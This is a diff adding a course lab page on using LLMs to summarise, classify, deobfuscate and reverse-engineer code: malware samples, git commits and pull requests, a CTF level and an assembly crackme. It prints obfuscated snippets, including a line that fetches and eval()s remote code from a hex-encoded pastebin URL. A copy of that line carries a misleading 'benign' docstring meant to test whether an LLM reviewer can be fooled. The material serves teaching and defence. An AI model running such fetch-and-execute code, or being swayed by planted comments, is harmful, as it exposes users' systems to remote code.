@@ -1,0 +1,647 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>08.1: Code Analysis and Reverse Engineering</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="/gensec-web/scripts/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="G08.1_CodAnalysisReverseEngineering" title="08.1: Code Analysis and Reverse Engineering" environment="web" feedback-link="https://docs.google.com/document/d/1_ZmayL0xi4LwbBYQcMs3LXaNmVJ1jx-R8ubTSaeXXrU">
+<google-codelab-step label="Setup" duration="3">
+<p>Using an LLM such as <a href="https://chat.openai.com/" target="_blank">ChatGPT</a>, <a href="https://gemini.google.com/" target="_blank">Gemini</a> , or <a href="https://copilot.microsoft.com/" target="_blank">Copilot</a> to aid in documenting, summarizing, classifying, analyzing, and reverse-engineering code, can save a developer and an analyst a substantial amount of time and effort. However, to leverage this capability, one must be able to understand what tasks the models are reliably capable of doing to prevent errors. In this lab, you will utilize LLMs to analyze different code examples and determine whether the result is accurate. To begin with, change into the code directory for the exercises and install the packages. </p>
+<pre>cd gensec-class
+git pull
+cd 08*
+uv init --python 3.13 --bare
+uv add -r requirements.txt</pre>
+</google-codelab-step>
+<google-codelab-step label="Documentation generation" duration="3">
+<p>Code summarization is often done by humans in order to generate documentation that can be used to allow others to understand code. One of the more reliable uses for LLMs is to produce such documentation. In Python, docstrings are used to provide this information. Consider the code below that reverses a string, but does not have any documentation associated with it.</p>
+<pre><code>def string_reverse(str1):
+    reverse_str1 = &#39;&#39;
+    i = len(str1)
+    while i &gt; 0:
+        reverse_str1 += str1[i - 1]
+        i = i- 1
+    return reverse_str1</code></pre>
+<p>The documentation for this function can be provided in a number of <a href="https://www.datacamp.com/tutorial/docstrings-python#python-docstring-in-classes-inacl" target="_blank">formats</a>. It&#39;s a labor-intensive and error-prone task for a developer to craft appropriate documentation in a particular formatting convention. Use an LLM to automatically generate the documentation of the above function in the sphinx format.</p>
+<ul>
+<li><strong>Take a screenshot of the result that includes your FAU email ID</strong></li>
+</ul>
+<p>Repeat the generation using the <code>numpy</code> format for the code below:</p>
+<pre><code>def connect(url, username, password):
+    try:
+        response = requests.get(url, auth=(username, password))
+        response.raise_for_status()
+        return response.text
+    except requests.RequestException as e:
+        print(f&#34;Error: {e}\nThis site cannot be reached&#34;)
+        sys.exit(1)</code></pre>
+<ul>
+<li><strong>Take a screenshot of the result that includes your FAU email ID</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Code summarization" duration="5">
+<p>When summarizing code, we can programmatically parse the program based on the language it is written in before sending it to an LLM for analysis. Within the directory, there&#39;s a Python parsing program that uses the <code>GenericLoader</code> document loader and <code>LanguageParser</code> parser to implement a Python code summarizer. </p>
+<pre><code>def summarize(path):
+    loader = GenericLoader.from_filesystem(
+            path,
+            glob=&#34;*&#34;,
+            suffixes=[&#34;.py&#34;],
+            parser=LanguageParser(language=&#34;python&#34;),
+    )
+    docs = loader.load()
+    prompt1 = PromptTemplate.from_template(&#34;Summarize this Python code: {text}&#34;)
+
+    chain = (
+      {&#34;text&#34;: RunnablePassthrough()}
+      | prompt1
+      | llm
+      | StrOutputParser()
+    )
+    output = &#34;\n&#34;.join([d.page_content for d in docs])
+    result = chain.invoke(output)</code></pre>
+<h2 is-upgraded><strong>src/p0.py</strong></h2>
+<p>View the source file in the <code>src</code> directory to get an understanding of what it does. </p>
+<ul>
+<li><strong>Find the two main operations that the code performs</strong></li>
+</ul>
+<p>Run the program in the repository below:</p>
+<pre>uv run 01_code_summarize.py</pre>
+<p>Within the program&#39;s interactive shell, have the program summarize the file. </p>
+<pre>src/p0.py</pre>
+<ul>
+<li><strong>Take a screenshot of the summary showing the operations that includes your FAU email ID</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="20">
+<p>Understanding unknown code is a task one might give an LLM, especially if the amount of code fits within the context window of a model. For example, one might use an LLM to determine whether or not code that has been downloaded from the Internet is malicious or not. Such an approach might be used to detect and prevent execution of malware that hijacks resources on a computer system, performs ransomware, or sets up a backdoor. </p>
+<h2 is-upgraded><strong>src/p1.py</strong></h2>
+<p>Examine the code for the program.</p>
+<ul>
+<li><strong>Find the mechanisms it uses to maintain persistence and steal information.</strong></li>
+</ul>
+<p>Then, use the prior program to summarize the code.</p>
+<ul>
+<li><strong>Take a screenshot of the summary describing the two mechanisms that includes your FAU email ID</strong></li>
+</ul>
+<h2 is-upgraded><strong>src/p2.py</strong></h2>
+<p>Examine the code for the program.</p>
+<ul>
+<li><strong>What is the purpose of the code? </strong></li>
+</ul>
+<p>Then, use the prior program to summarize the code.</p>
+<ul>
+<li><strong>Take a screenshot of the summary correctly identifying the purpose of the code that includes your FAU email ID</strong></li>
+</ul>
+<h2 is-upgraded><strong>src/p3.py</strong></h2>
+<p>Examine the code for the program.</p>
+<ul>
+<li><strong>What command does the program respond to?</strong></li>
+</ul>
+<p>Then, use the prior program to summarize the code.</p>
+<ul>
+<li><strong>Take a screenshot of the summary correctly identifying the command the code responds to that includes your FAU email ID</strong></li>
+</ul>
+<h2 is-upgraded><strong>src/p4.py</strong></h2>
+<p>Examine the code for the program.</p>
+<ul>
+<li><strong>Find the types of data it accesses and the mechanism used for exfiltration </strong></li>
+</ul>
+<p>Then, use the prior program to summarize the code.</p>
+<ul>
+<li><strong>Take a screenshot of the summary correctly identifying the types of data and the exfiltration method that includes your FAU email ID</strong></li>
+</ul>
+<h2 is-upgraded><strong>src/p5.py</strong></h2>
+<p>Examine the code for the program taken from an <a href="https://www.endorlabs.com/learn/llm-assisted-malware-review-ai-and-humans-join-forces-to-combat-malware" target="_blank">article</a> on LLM-assisted malware analysis of Python packages. Its original source can be found <a href="https://inspector.pypi.io/project/web3toolz/0.8/packages/1f/22/8788de74793d3f4da61816e3f505db211d97592263f3f1092f66df8501cb/web3toolz-0.8-py3-none-any.whl/web3toolz/steam.py" target="_blank">here</a>.</p>
+<ul>
+<li><strong>Find what files it accesses and how it obtains its exfiltration destination</strong></li>
+</ul>
+<p>Then, use the prior program to summarize the code.</p>
+<ul>
+<li><strong>Take a screenshot of the summary correctly identifying the types of data and the mechanism used to obtain its exfiltration destination that includes your FAU email ID</strong></li>
+</ul>
+<h2 is-upgraded><strong>src/p6.py</strong></h2>
+<p>Another example from the <a href="https://www.endorlabs.com/learn/llm-assisted-malware-review-ai-and-humans-join-forces-to-combat-malware" target="_blank">article </a>is also included. Its original source can be found <a href="https://inspector.pypi.io/project/phoenixc2/1.0/packages/80/87/df4c03b60c57da2e213c9f95d989262fbf2c8b7c9b179bef77ce2a47d326/phoenixc2-1.0-py3-none-any.whl/phoenixc2/server/kits/http_reverse/payloads/python.payload.py" target="_blank">here</a>.</p>
+<ul>
+<li><strong>Find the function of the program and the types of payloads it can execute</strong></li>
+</ul>
+<p>Then, use the prior program to summarize the code.</p>
+<ul>
+<li><strong>Take a screenshot of the summary correctly identifying the purpose of the program and the payload types it supports that includes your FAU email ID</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Code classification" duration="20">
+<p>Classifying unknown code is a task one might give an LLM as well. Similar to the prior exercise, we can configure a prompt to have an LLM analyze whether or not code performs specific operations that might be indicative of malware such as:</p>
+<ul>
+<li>Data exfiltration</li>
+<li>File creation</li>
+<li>Process launching</li>
+<li>Environment variable access</li>
+</ul>
+<p>We can slightly modify our prior code to ask an LLM to evaluate whether a particular program performs each operation. This is done via a prompt shown below:</p>
+<pre><code>You are an advanced security analyst. Your task is to perform a behavioral analysis looking for specific behaviors such as:
+  - **Data exfiltration**: Detect if data is sent off-machine or communicates with external IPs or servers.
+  - **File creation**: Identify instances where files are created, deleted, or modified in the file system.
+  - **Process launching**: Detect if new processes are launched or system commands are executed.
+  - **Environment variable access**: Determine if environment variables are read or modified.</code></pre>
+<p>LLMs are good at returning output that matches a given format. For this exercise, we can specify the results be returned in JSON via the prompt as well:</p>
+<pre><code>For each behavior detected, provide supporting evidence and assign a confidence score (0 to 1).
+
+Respond in JSON format with the following structure:
+  &#123;&#123;
+    &#34;behavior_analysis&#34;: [
+        &#123;&#123; &#34;data_exfiltration&#34;: &#123;&#123; &#34;detected&#34;: true/false, &#34;confidence&#34;: 0-1, &#34;evidence&#34;: &#34;description of findings&#34;, &#34;code_snippet&#34;: &#34;snippet of code&#34; }} }},
+        &#123;&#123; &#34;file_creation&#34;: &#123;&#123; &#34;detected&#34;: true/false, &#34;confidence&#34;: 0-1, &#34;evidence&#34;: &#34;description of findings&#34;, &#34;code_snippet&#34;: &#34;snippet of code&#34; }} }},
+        ...
+  }}</code></pre>
+<h2 is-upgraded><strong>src/p0.py</strong></h2>
+<p>Run the program in the repository below to perform program classifications.</p>
+<pre>uv run 02_code_classify.py</pre>
+<p>Within the program&#39;s interactive shell, have the program classify the file. For each classification category that is marked as &#39;<code>true</code>&#39;</p>
+<ul>
+<li><strong>Create a table of the </strong><strong><code>code_snippet</code></strong><strong> returned for each that the LLM identifies as evidence</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="20">
+<h2 is-upgraded><strong>src/p1.py</strong></h2>
+<p>Have the program classify the file. For each classification category that is marked as &#39;<code>true</code>&#39;</p>
+<ul>
+<li><strong>Create a table of the </strong><strong><code>code_snippet</code></strong><strong> returned for each that the LLM identifies as evidence</strong></li>
+</ul>
+<h2 is-upgraded><strong>src/p2.py</strong></h2>
+<p>Have the program classify the file. For each classification category that is marked as &#39;<code>true</code>&#39;</p>
+<ul>
+<li><strong>Create a table of the </strong><strong><code>code_snippet</code></strong><strong> returned for each that the LLM identifies as evidence</strong></li>
+</ul>
+<h2 is-upgraded><strong>src/p3.py</strong></h2>
+<p>Have the program classify the file. For each classification category that is marked as &#39;<code>true</code>&#39;</p>
+<ul>
+<li><strong>Create a table of the </strong><strong><code>code_snippet</code></strong><strong> returned for each that the LLM identifies as evidence</strong></li>
+</ul>
+<h2 is-upgraded><strong>src/p4.py</strong></h2>
+<p>Have the program classify the file. For each classification category that is marked as &#39;<code>true</code>&#39;</p>
+<ul>
+<li><strong>Create a table of the </strong><strong><code>code_snippet</code></strong><strong> returned for each that the LLM identifies as evidence</strong></li>
+</ul>
+<h2 is-upgraded><strong>src/p5.py</strong></h2>
+<p>Have the program classify the file. For each classification category that is marked as &#39;<code>true</code>&#39;</p>
+<ul>
+<li><strong>Create a table of the </strong><strong><code>code_snippet</code></strong><strong> returned for each that the LLM identifies as evidence</strong></li>
+</ul>
+<h2 is-upgraded><strong>src/p6.py</strong></h2>
+<p>Have the program classify the file. For each classification category that is marked as &#39;<code>true</code>&#39;</p>
+<ul>
+<li><strong>Create a table of the </strong><strong><code>code_snippet</code></strong><strong> returned for each that the LLM identifies as evidence</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Repository analysis via git" duration="20">
+<p>Open-source repositories managed via git are often targets for malicious software developers. Adversaries can publish malicious repositories, submit malicious commits, or initiate malicious pull requests. Automatically monitoring and reporting on potential threats and vulnerabilities in a repository can be useful with several services such as GitHub&#39;s <a href="https://github.com/dependabot" target="_blank">Dependabot</a> and Snyk&#39;s <a href="https://snyk.io/product/snyk-code/" target="_blank">code analysis</a> offerings providing real-time notifications on potential issues in a codebase. However, adversaries have been known to flood repositories with malicious pull requests that masquerade as legitimate services such as Dependabot attempting to patch vulnerable code in order to trick a maintainer into installing an <a href="https://www.bleepingcomputer.com/news/security/github-repos-bombarded-by-info-stealing-commits-masked-as-dependabot/" target="_blank">info stealer</a> shown below.</p>
+<p class="image-container"><img style="width:624px" src="img/30dfa0191dcfa62f.png"></p>
+<p>With repository maintainers receiving many pull requests from other developers wishing to add functionality or fix bugs in the codebase, it is important to verify that the requests are legitimate. Understanding unknown code is a task one might give an LLM, especially as a first pass, to reduce the load on the repository maintainer. In this exercise, we will combine an LLM&#39;s code analysis and summarization abilities with Python support for navigating GitHub repositories.</p>
+</google-codelab-step>
+<google-codelab-step label="-" duration="3">
+<h2 is-upgraded><strong>File analysis</strong></h2>
+<p>Retrieving a file from a repository and examining its commits allows one to identify problematic code and track how it entered the source tree. Consider the code below that utilizes PyGithub to retrieve the contents of a file in a repository given its path, to identify the last commit that modified the file, and to obtain the changes made as a result of that commit.</p>
+<pre><code>import os
+import github
+github_token = os.getenv(&#34;GITHUB_PERSONAL_ACCESS_TOKEN&#34;)
+g = github.Github(github_token)
+repo = g.get_repo(&#34;user/repository_name&#34;)
+
+file_path = &#34;path/to/file&#34;
+file_content = repo.get_contents(file_path).decoded_content.decode(&#34;utf-8&#34;)
+commits = repo.get_commits(path=file_path)
+commit = commits[0]
+commit_data = f&#34;- Commit SHA: {commit.sha}\n  Author: {commit.commit.author.name}\n  Date: {commit.commit.author.date}\n  Message: {commit.commit.message}\n&#34;
+
+full_commit = repo.get_commit(commit.sha)
+for file in full_commit.files:
+    if file.filename == file_path:
+        full_commit_data = f&#34; - File: {file.filename}\n - Changes: {file.changes}\n - Additions: {file.additions}\n - Deletions: {file.deletions}\n - Diff: \n{file.patch}&#34;</code></pre>
+<pre><code>prompt = PromptTemplate(
+        input_variables=[&#34;file_path&#34;, &#34;file_content&#34;, &#34;commit_data&#34;, &#34;full_commit_data&#34;],
+        template=&#34;&#34;&#34;You are a git file analyzer.  The code to the file and information on its last commit is given.  1. Explain what the file does.  2. Summarize what happened in the last commit for the file.
+      File name: {file_path}\n\n
+      File contents: {file_content}\n\n
+      Last commit: {commit_data} \n\n
+      Last commit modifications: {full_commit_data}\n\n
+
+      Answer: &#34;&#34;&#34;
+    )
+chain = prompt | llm
+summary = chain.invoke({
+    &#39;file_path&#39;: file_path,
+    &#39;file_content&#39;: file_content,
+    &#39;commit_data&#39;: commit_data,
+    &#39;full_commit_data&#39;: full_commit_data
+})
+print(summary)</code></pre>
+<p>Run the program in the repository to analyze a file.</p>
+<pre>uv run 03a_git_file.py</pre>
+<p>Then, prompt the program about one of the prior examples:</p>
+<pre>08_.../src/p5.py</pre>
+<ul>
+<li><strong>Take a screenshot of the hash of the last commit that includes your FAU email ID</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="3">
+<h2 is-upgraded><strong>Commit analysis</strong></h2>
+<p>Retrieving a file from a repository and examining its commits allows one to identify problematic code and track how it entered the repository. In this exercise, we prompt the model with instructions to identify whether particular commits are malicious using the prompt template below.</p>
+<pre><code>commit_prompt = PromptTemplate(
+        input_variables=[&#34;author&#34;, &#34;date&#34;, &#34;message&#34;, &#34;changes&#34;],
+        template=&#34;&#34;&#34;You are a git commit analyzer.  A commit is given with the names of files and their changes.  Analyze the commit to determine 3 things: 1. What the code in the commit does.  2. Whether the code does what the commit message claims.  3. Whether the code in the commit is malicious.
+
+      Commit author: {author} \n\n Commit date: {date} \n\n
+      Commit message: {message} \n\n File changes: {changes} \n\n
+
+      Answer: &#34;&#34;&#34;
+    )</code></pre>
+<p>Run the program in the repository to analyze a commit.</p>
+<pre>uv run 03b_git_commit.py</pre>
+<p>Then, prompt the program about one of the commits:</p>
+<pre>9de23d6fa07fe80a526376ddd2de53c7641b6901</pre>
+<ul>
+<li><strong>Take a screenshot of the files that have been flagged as malicious that includes your FAU email ID</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="3">
+<h2 is-upgraded><strong>Pull request analysis</strong></h2>
+<p>Pull requests are often initiated to add or modify code in a repository. Unfortunately, some requests may contain malicious changes. As a result, it is helpful to analyze them for potential issues using an LLM or to have an LLM examine prior pull requests to track how problematic entered the code base. Consider the code below that pulls out the contents of a particular pull and prompts an LLM to determine if it is malicious.</p>
+<pre><code>g = Github(...)
+repo = g.get_repo(...)
+
+def process_pull_request(pr_number):
+    &#34;&#34;&#34;Given a pull request by its integer identifier, returns a summary of what it does and whether it is malicious&#34;&#34;&#34;
+    pull = repo.get_pull(pr_number)
+    pr_prompt = PromptTemplate(
+        input_variables=[&#34;title&#34;, &#34;body&#34;, &#34;diff&#34;],
+         template=&#34;&#34;&#34;You are a git pull request analyzer.  A pull request is given with its title, description, and its source-code diff.  Analyze the request to determine 3 things: 1. What the code in the pull request does.  2. Whether the code does what the title and description claims.  3. Whether the code is malicious. \n\n
+      Title: {title}\n\n Description: {body}\n\n Diff: {diff}\n\n
+      Answer: &#34;&#34;&#34;
+    )
+    pr_data = {}
+    pr_data[&#39;title&#39;] = pull.title
+    pr_data[&#39;body&#39;] = pull.body or &#34;No description provided.&#34;
+    pr_data[&#39;diff&#39;] = requests.get(pull.diff_url).text
+
+    chain = pr_prompt | llm
+    summary = chain.invoke({
+        &#39;title&#39;: pr_data[&#39;title&#39;],
+        &#39;body&#39;: pr_data[&#39;body&#39;],
+        &#39;diff&#39;: pr_data[&#39;diff&#39;]
+    })
+    return(summary.content)</code></pre>
+<p>Run the program in the repository to analyze a pull request.</p>
+<pre>uv run 03c_git_pull_request.py</pre>
+<p>Then, prompt the program about a specific pull request.</p>
+<pre>22</pre>
+<ul>
+<li><strong>Take a screenshot of the problematic files that have been added that includes your FAU email ID</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Python deobfuscation" duration="3">
+<p>Modern malware utilizes a range of encoding and encryption techniques to hide itself from detection. In reverse-engineering these pieces of malware, one would like to automate the task. Consider the <a href="https://www.sentinelone.com/labs/automating-string-decryption-and-other-reverse-engineering-tasks-in-radare2-with-r2pipe/" target="_blank">OSX.Fairytale</a> malware that uses XOR with the byte 0x30 to encrypt a string followed by Base64 to encode the result in order to hide it from anti-malware detectors looking for particular strings. An assembly snippet that shows the decoding of is shown below:</p>
+<p class="image-container"><img style="width:624px" src="img/978c0500e9746689.png"></p>
+<p>A set of encrypted strings found in the malware is below.</p>
+<pre>U1hRXl5VXA==
+cV5EWR1mWUJFQw==
+H1JZXh9cUUVeU1hTRFw=
+WEREQAofH0JDBgReQlweWV5WXx9CVVFUUUVEX1lAHkBYQA9AQlVWWUgNRUBUCg==</pre>
+<p>Prompt an LLM to decrypt the strings automatically without giving it any information.</p>
+<ul>
+<li><strong>Take a screenshot of the results that includes your FAU email ID</strong></li>
+</ul>
+<p>Next, repeat the prompt but give the LLM additional information that it may use XOR encryption or is part of the Fairytale malware</p>
+<ul>
+<li><strong>Take a screenshot of the results that includes your FAU email ID</strong></li>
+</ul>
+<p>Finally, repeat the prompt, but give the LLM the entire encryption algorithm including the XOR key used and ask it to perform the decryption. If it can not do the operation, ask it for Python code you can run to decrypt the strings. Ensure you have produced the decrypted strings.</p>
+<ul>
+<li><strong>Take a screenshot of the results that includes your FAU email ID</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="3">
+<p>One of the common uses for an LLM is to generate obfuscated, polymorphic code that can evade detection from security monitors. An LLM can reverse simple encryption techniques like the one shown below. </p>
+<pre><code>code = &#34;&#34;&#34;
+func = __builtins__[&#34;svyr&#34;.decode(&#34;rot13&#34;)]
+func(&#34;test.txt&#34;, &#34;w&#34;).write(&#34;Kaboom!\\n&#34;)
+&#34;&#34;&#34;
+s.execute(code)</code></pre>
+<p>Prompt an LLM to reverse engineer this code. </p>
+<ul>
+<li><strong>Take a screenshot of the results that includes your FAU email ID</strong></li>
+</ul>
+<p>LLMs can also easily undo encoding mechanisms designed to disguise functionality. Consider the Python code below.</p>
+<pre><code>exec(&#39;&#39;.join([chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(34)+chr(72)+chr(101)+chr(108)+chr(108)+chr(111)+chr(32)+chr(119)+chr(111)+chr(114)+chr(108)+chr(100)+chr(33)+chr(34)+chr(41)]))</code></pre>
+<p>Prompt an LLM, identify the function of this code and deobfuscate it to generate its original form.</p>
+<ul>
+<li><strong>Take a screenshot of the results that includes your FAU email ID</strong></li>
+</ul>
+<p>An LLM that deobfuscates then analyzes code for malicious intent can be useful if it can do so reliably. Consider the code below.</p>
+<pre><code>import requests
+eval(requests.get(&#39;\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x61\x73\x74\x65\x62\x69\x6e\x2e\x63\x6f\x6d\x2f\x72\x61\x77\x2f\x66\x38\x34\x64\x66\x77\x30\x6d&#39;).text)</code></pre>
+<p>Run the code manually and determine its function. Then, ask an LLM to determine the function of the code.</p>
+<ul>
+<li><strong>Take a screenshot of the results that includes your FAU email ID. Is the LLM correct?</strong></li>
+</ul>
+<p>An equivalent program is shown below, but with a bit of social engineering to make it appear innocuous.</p>
+<pre><code>import requests
+
+def benign_code():
+&#34;&#34; This code downloads additional benign functionality from a remote server. &#34;&#34;
+eval(requests.get(&#39;\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x61\x73\x74\x65\x62\x69\x6e\x2e\x63\x6f\x6d\x2f\x72\x61\x77\x2f\x66\x38\x34\x64\x66\x77\x30\x6d&#39;).text)
+foo = &#39;Benign code has been executed&#39;</code></pre>
+<p>In a new session, ask an LLM to the same questions again.</p>
+<ul>
+<li><strong>Take a screenshot of the results that includes your FAU email ID. Does the LLM change its assessment?</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="15">
+<p>Consider the code below that is part of a CTF level in <code>src/bloat.py</code>. Your goal is to find the flag associated with the level.</p>
+<h3 is-upgraded>bloat.py</h3>
+<pre><code>import sys
+a = &#34;!\&#34;#$%&amp;&#39;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;+ \
+            &#34;[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ &#34;
+def arg133(arg432):
+  if arg432 == a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68]:
+    return True
+  else:
+    print(a[51]+a[71]+a[64]+a[83]+a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+\
+a[81]+a[67]+a[94]+a[72]+a[82]+a[94]+a[72]+a[77]+a[66]+a[78]+a[81]+\
+a[81]+a[68]+a[66]+a[83])
+    sys.exit(0)
+    return False
+def arg111(arg444):
+  return arg122(arg444.decode(), a[81]+a[64]+a[79]+a[82]+a[66]+a[64]+a[75]+\
+a[75]+a[72]+a[78]+a[77])
+def arg232():
+  return input(a[47]+a[75]+a[68]+a[64]+a[82]+a[68]+a[94]+a[68]+a[77]+a[83]+\
+a[68]+a[81]+a[94]+a[66]+a[78]+a[81]+a[81]+a[68]+a[66]+a[83]+\
+a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+a[81]+a[67]+a[94]+\
+a[69]+a[78]+a[81]+a[94]+a[69]+a[75]+a[64]+a[70]+a[25]+a[94])
+def arg132():
+  return open(&#39;flag.txt.enc&#39;, &#39;rb&#39;).read()
+def arg112():
+  print(a[54]+a[68]+a[75]+a[66]+a[78]+a[76]+a[68]+a[94]+a[65]+a[64]+a[66]+\
+a[74]+a[13]+a[13]+a[13]+a[94]+a[88]+a[78]+a[84]+a[81]+a[94]+a[69]+\
+a[75]+a[64]+a[70]+a[11]+a[94]+a[84]+a[82]+a[68]+a[81]+a[25])
+def arg122(arg432, arg423):
+    arg433 = arg423
+    i = 0
+    while len(arg433) &lt; len(arg432):
+        arg433 = arg433 + arg423[i]
+        i = (i + 1) % len(arg423)        
+    return &#34;&#34;.join([chr(ord(arg422) ^ ord(arg442)) for (arg422,arg442) in zip(arg432,arg433)])
+arg444 = arg132()
+arg432 = arg232()
+arg133(arg432)
+arg112()
+arg423 = arg111(arg444)
+print(arg423)
+sys.exit(0)</code></pre>
+<p>Use an LLM to deobfuscate the code and produce the decrypted flag.</p>
+<ul>
+<li><strong>Take a screenshot of the results that includes your FAU email ID.</strong></li>
+</ul>
+<p>Once you have been able to reverse the code, change into the <code>src</code> directory and solve the level:</p>
+<pre><code>cd src
+python3 bloat.py</code></pre>
+<ul>
+<li><strong>Take a screenshot of the flag that includes your FAU email ID. </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Binary reverse-engineering" duration="2">
+<p>Reverse engineering binary code is often done when dealing with malicious code. Many automated tools have been created for reverse-engineering and are often built using heuristics gleaned from analyzing a large corpora of binary payloads manually. Large-language models perform a similar function and could potentially be used to help reverse-engineer difficult payloads automatically. Below is the assembly version of a CTF level for binary reverse engineering. It asks for a password string from the user, then prints &#34;<code>Good Job.</code>&#34; if it is correct.</p>
+<h3 is-upgraded>Ch04x86_AsciiStrcmp.s</h3>
+<pre><code>        .file   &#34;program.c&#34;
+        .text
+        .section        .rodata
+.LC0:
+        .string &#34;Enter the password: &#34;
+.LC1:
+        .string &#34;%10s&#34;
+.LC2:
+        .string &#34;ViZjc4YTE&#34;
+.LC3:
+        .string &#34;Try again.&#34;
+.LC4:
+        .string &#34;Good Job.&#34;
+        .text
+        .globl  main
+        .type   main, @function
+main:
+.LFB0:
+        leal    4(%esp), %ecx
+        andl    $-16, %esp
+        pushl   -4(%ecx)
+        pushl   %ebp
+        movl    %esp, %ebp
+        pushl   %ecx
+        subl    $20, %esp
+        movl    $0, -12(%ebp)
+        subl    $12, %esp
+        pushl   $.LC0
+        call    printf
+        addl    $16, %esp
+        subl    $8, %esp
+        leal    -24(%ebp), %eax
+        pushl   %eax
+        pushl   $.LC1
+        call    __isoc99_scanf
+        addl    $16, %esp
+        movb    $77, -13(%ebp)
+        movzbl  -24(%ebp), %eax
+        cmpb    %al, -13(%ebp)
+        je      .L2
+        movl    $1, -12(%ebp)
+.L2:
+        leal    -24(%ebp), %eax
+        addl    $1, %eax
+        subl    $8, %esp
+        pushl   $.LC2
+        pushl   %eax
+        call    strcmp
+        addl    $16, %esp
+        testl   %eax, %eax
+        je      .L3
+        movl    $1, -12(%ebp)
+.L3:
+        cmpl    $0, -12(%ebp)
+        je      .L4
+        subl    $12, %esp
+        pushl   $.LC3
+        call    puts
+        addl    $16, %esp
+        jmp     .L5
+.L4:
+        subl    $12, %esp
+        pushl   $.LC4
+        call    puts
+        addl    $16, %esp
+.L5:
+        movl    $0, %eax
+        movl    -4(%ebp), %ecx
+        leave
+        leal    -4(%ecx), %esp
+        ret
+.LFE0:
+        .size   main, .-main
+        .ident  &#34;GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0&#34;
+        .section        .note.GNU-stack,&#34;&#34;,@progbits</code></pre>
+<p>Prompt an LLM to see what it thinks the assembly code does to see if it is able to correctly identify the purpose of the binary and the user input that would cause this program to print &#34;<code>Good Job.</code>&#34;</p>
+<ul>
+<li><strong>Take a screenshot showing the results that includes your FAU email ID</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="-" duration="2">
+<p>The source code of the level is shown below. </p>
+<h3 is-upgraded>Ch04x86_AsciiStrcmp.c</h3>
+<pre><code>#include &lt;string.h&gt;
+#define USERDEF0 &#39;M&#39;
+#define USERDEF1 &#34;ViZjc4YTE&#34;
+int main()
+{
+    char c0;
+    int flag=0;
+    char user_input[11];
+
+    printf(&#34;Enter the password: &#34;);
+    scanf(&#34;%10s&#34;,user_input);
+
+    c0=USERDEF0;
+    if (user_input[0] != c0) flag=1;
+
+    if (strcmp(user_input+1,USERDEF1)) flag=1;
+
+    if (flag)
+        printf (&#34;Try again.\n&#34;);
+    else
+        printf(&#34;Good Job.\n&#34;);
+    return 0;
+}</code></pre>
+<p>Given the source code of the program, ask an LLM to explain it and see if it correctly identifies it as the original source code of the binary and can provide the user input that causes the program to print &#34;<code>Good Job.</code>&#34;</p>
+<ul>
+<li><strong>Take a screenshot showing the results that includes your FAU email ID</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Binary reverse engineering with Ghidra" duration="3">
+<p>LLMs are great at summarizing sequential text, but most LLMs have not been trained on binary program data. To ensure this limitation doesn&#39;t prevent us from reverse-engineering the binary accurately, we can convert binary program data into a more concise and interpretable format before asking an LLM to perform the task. In this exercise, we&#39;ll leverage an external reverse engineering tool called Ghidra that is purpose-built to decompile binary program files. The output of this tool can then be used to perform an analysis. This pattern of utilizing purpose-built tools by an LLM agent rather than having the LLM perform, not only makes the task more accurate, it can also save substantial computational costs.</p>
+<h2 is-upgraded><strong>Setup</strong></h2>
+<p>Bring up the course VM and <code>ssh</code> into it. Install the necessary dependencies:</p>
+<pre>sudo apt update -y
+sudo apt install openjdk-21-jdk -y
+
+cd $HOME
+
+wget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_11.0.3_build/ghidra_11.0.3_PUBLIC_20240410.zip
+unzip ghidra_11.0.3_PUBLIC_20240410.zip
+mv ghidra_11.0.3_PUBLIC ghidra
+echo &#39;export PATH=$PATH:$HOME/ghidra/support&#39; &gt;&gt; ~/.bashrc
+source ~/.bashrc</pre>
+<h2 is-upgraded><strong>Program</strong></h2>
+<p>Now that Ghidra is installed and the support folder is in the path, we can use the headless script in the folder to summarize binary files.The Python program in the repository calls <code>analyzeHeadless</code> with the <code>-postScript</code> tag to analyze the binary file.</p>
+<pre><code>command = [
+    &#34;analyzeHeadless&#34;,
+    project_dir,
+    project_name,
+    &#34;-import&#34;,
+    binary_path,
+    &#34;-postScript&#34;,
+    script_path
+]
+
+# Execute the command
+result = subprocess.run(command, text=True, capture_output=True)</code></pre>
+</google-codelab-step>
+<google-codelab-step label="-" duration="3">
